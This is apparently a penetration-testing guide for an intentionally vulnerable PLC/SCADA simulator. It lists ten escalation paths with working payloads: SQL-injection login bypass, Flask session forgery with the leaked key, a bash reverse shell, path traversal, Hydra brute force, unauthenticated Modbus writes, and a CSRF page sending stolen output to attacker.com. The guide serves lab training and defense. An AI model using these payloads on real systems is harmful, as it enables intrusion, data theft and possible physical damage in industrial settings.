# Privilege Escalation Guide

This document outlines the privilege escalation paths in the Vulnerable PLC Simulator for penetration testing practice.

## User Roles and Permissions

### Guest Role (Lowest Privilege)
**Login:** `guest / guest`

**Allowed:**
- ✓ View dashboard
- ✓ View HMI interface (read-only)
- ✓ View SCADA dashboard (read-only)
- ✓ View process status
- ✓ View alarms (read-only)
- ✓ View trending data
- ✓ Read PLC registers

**Denied:**
- ✗ Control equipment (pump, valve, motor)
- ✗ Write to PLC registers
- ✗ Acknowledge alarms
- ✗ Access admin panel
- ✗ Execute system commands
- ✗ View logs
- ✗ Manage users

### Operator Role (Medium Privilege)
**Login:** `operator / operator123`

**Allowed (in addition to guest):**
- ✓ Control equipment
- ✓ Write to PLC registers
- ✓ Acknowledge alarms
- ✓ View logs
- ✓ Process control operations

**Denied:**
- ✗ Access admin panel
- ✗ Execute system commands
- ✗ Manage users

### Admin Role (Full Privilege)
**Login:** `admin / admin`

**Allowed (everything):**
- ✓ All operator permissions
- ✓ Access admin panel
- ✓ Execute system commands
- ✓ Manage users
- ✓ Full system access

---

## Privilege Escalation Paths

### Path 1: SQL Injection to Admin

**Difficulty:** Easy
**Starting Role:** None (not logged in)

1. Navigate to login page
2. Use SQL injection to bypass authentication:
   ```
   Username: admin' OR '1'='1
   Password: anything
   ```
3. You're now logged in as admin

**Why it works:** The login query is vulnerable to SQL injection, allowing authentication bypass.

---

### Path 2: Session Manipulation

**Difficulty:** Medium
**Starting Role:** Guest

The session cookie contains user role information that can be manipulated.

1. Login as guest (`guest / guest`)
2. Open browser developer tools (F12)
3. Go to Storage/Application > Cookies
4. Find the session cookie
5. The session is stored server-side, but you can try to:
   - Brute force session IDs
   - Perform session fixation
   - Try CSRF attacks

**Alternate approach:**
1. Use the `/debug` endpoint to view session info:
   ```bash
   curl http://localhost:5000/debug
   ```
2. Look for the secret key and session structure
3. Forge a new session with admin role

**Why it works:** Weak session secret key (`insecure-secret-key-12345`) can be exploited to forge sessions.

---

### Path 3: Direct Role Modification via API

**Difficulty:** Medium
**Starting Role:** Guest

1. Login as guest
2. Try to directly modify your role by manipulating API requests:
   ```bash
   # Capture your session cookie
   SESSION_COOKIE="your_session_cookie_here"

   # Try to call admin-only endpoint
   curl -X POST http://localhost:5000/api/process/control \
     -H "Cookie: session=$SESSION_COOKIE" \
     -H "Content-Type: application/json" \
     -d '{"action":"pump","value":true}'
   ```
3. You'll get an "Access Denied" response with error details
4. The response reveals your current role and required role

**Why it fails (intentionally):** The role check is working here, but the error message leaks information.

---

### Path 4: Database Manipulation

**Difficulty:** Medium
**Starting Role:** Guest or Operator

If you can execute commands (via command injection), you can modify the database:

1. First, escalate to operator or admin to access command execution
2. Access `/admin/system` (requires admin - use Path 1 or 2)
3. Execute database manipulation:
   ```bash
   sqlite3 plc.db "UPDATE users SET role='admin' WHERE username='guest'"
   ```
4. Logout and login as guest again
5. You now have admin privileges

**Why it works:** Direct database access if you have command execution.

---

### Path 5: Cookie/Session Poisoning

**Difficulty:** Hard
**Starting Role:** Guest

Since the secret key is weak and exposed via `/debug`:

1. Get the secret key:
   ```bash
   curl http://localhost:5000/debug | jq '.secret_key'
   ```
2. Use Python to forge a session:
   ```python
   from flask import Flask
   from flask.sessions import SecureCookieSessionInterface

   app = Flask(__name__)
   app.secret_key = 'insecure-secret-key-12345'

   session_interface = SecureCookieSessionInterface()

   # Create admin session
   session = {'username': 'admin', 'role': 'admin'}

   # Sign it
   signed_session = session_interface.get_signing_serializer(app).dumps(session)
   print(signed_session)
   ```
3. Use this forged session cookie

**Why it works:** Weak secret key + information disclosure.

---

### Path 6: Command Injection from Guest

**Difficulty:** Hard (Multi-step)
**Starting Role:** Guest

This requires chaining multiple vulnerabilities:

1. Use SQL injection to gain admin access (Path 1)
2. Navigate to Admin Panel > System Control
3. Execute arbitrary commands:
   ```bash
   cat /etc/passwd
   whoami
   id
   ```
4. Gain shell access:
   ```bash
   bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
   ```

**Why it works:** Command injection vulnerability exists in admin panel.

---

### Path 7: Modbus Register Manipulation

**Difficulty:** Medium
**Starting Role:** Anyone with network access

Modbus protocol has no authentication by default:

1. Connect to Modbus server (port 5502):
   ```bash
   # Using modbus-cli
   modbus write localhost:5502 0 31337
   ```
2. Write malicious values to control registers
3. This affects the process without authentication
4. Could cause physical damage in real ICS environment

**Why it works:** No authentication on Modbus protocol (realistic vulnerability).

---

### Path 8: Credential Stuffing/Brute Force

**Difficulty:** Easy
**Starting Role:** None

Default credentials are well-known:

1. Try common credentials:
   ```
   admin/admin
   operator/operator123
   guest/guest
   ```
2. Use Hydra for brute force:
   ```bash
   hydra -l admin -P passwords.txt localhost -s 5000 http-post-form \
     "/login:username=^USER^&password=^PASS^:Invalid credentials"
   ```

**Why it works:** Weak default passwords with no rate limiting.

---

### Path 9: Information Disclosure to Escalation

**Difficulty:** Medium
**Starting Role:** Guest

1. Access unprotected endpoints:
   ```bash
   # Debug endpoint
   curl http://localhost:5000/debug

   # Directory traversal
   curl http://localhost:5000/backup/plc.db
   curl http://localhost:5000/backup/../../../../etc/passwd
   ```
2. Extract sensitive information:
   - Secret key
   - Database file
   - User credentials
   - Session structure
3. Use this information for other attacks

**Why it works:** Multiple information disclosure vulnerabilities.

---

### Path 10: CSRF to Admin Actions

**Difficulty:** Medium
**Starting Role:** Guest (but need to trick admin)

Create malicious page that executes admin actions:

```html
<html>
<body>
<script>
fetch('http://localhost:5000/admin/exec', {
  method: 'POST',
  credentials: 'include',
  body: new URLSearchParams({
    'command': 'cat /etc/passwd'
  })
})
.then(r => r.json())
.then(data => {
  // Exfiltrate data
  fetch('http://attacker.com/steal?data=' + btoa(data.output));
});
</script>
</body>
</html>
```

**Why it works:** No CSRF protection implemented.

---

## Practice Scenarios

### Scenario 1: Guest to Operator
**Goal:** Escalate from guest to operator privileges

**Hints:**
- Can you manipulate the session?
- What information is leaked by error messages?
- Can you exploit SQL injection?

### Scenario 2: Guest to Admin (No SQL Injection)
**Goal:** Become admin without using SQL injection

**Hints:**
- Check the `/debug` endpoint
- Look at session management
- Consider session forgery

### Scenario 3: Command Execution from Guest
**Goal:** Execute system commands starting as guest

**Hints:**
- You'll need to chain multiple vulnerabilities
- First escalate to admin
- Then use command injection

### Scenario 4: Persistent Access
**Goal:** Maintain admin access even after password change

**Hints:**
- Can you create a backdoor user?
- Can you modify the database?
- Can you establish a reverse shell?

---

## Detection Tips

As a defender, watch for:

1. **Failed login attempts** - Check logs for brute force
2. **SQL injection attempts** - Look for quotes and SQL keywords in logs
3. **Unusual session activity** - Session IDs changing rapidly
4. **Access denied errors** - Guest trying admin endpoints
5. **Command execution logs** - Suspicious commands in audit logs
6. **Modbus writes from unexpected sources** - Network monitoring
7. **Directory traversal attempts** - Weird file paths in requests
8. **Debug endpoint access** - Anyone accessing /debug

---

## Mitigation Exercises

Practice fixing these vulnerabilities:

1. **SQL Injection:**
   - Use parameterized queries
   - Input validation

2. **Weak Sessions:**
   - Strong random secret key
   - Secure session configuration

3. **Command Injection:**
   - Input validation
   - Avoid shell=True
   - Use safe subprocess methods

4. **Access Control:**
   - Check user role in database
   - Don't rely only on session
   - Implement proper RBAC

5. **Information Disclosure:**
   - Remove debug endpoints
   - Validate file paths
   - Hide sensitive errors

6. **Modbus Security:**
   - Add authentication layer
   - Use VPN/firewall
   - Network segmentation

---

## Responsible Testing

Remember:
- ✓ Only test on this isolated environment
- ✓ Document your findings
- ✓ Practice both attack and defense
- ✓ Learn how to fix vulnerabilities
- ✗ Never use these techniques on unauthorized systems

---

## Quick Reference

| Role     | Login              | Can View | Can Control | Can Admin |
|----------|-------------------|----------|-------------|-----------|
| Guest    | guest/guest       | ✓        | ✗           | ✗         |
| Operator | operator/operator123 | ✓     | ✓           | ✗         |
| Admin    | admin/admin       | ✓        | ✓           | ✓         |

---

**Happy (Ethical) Hacking!**
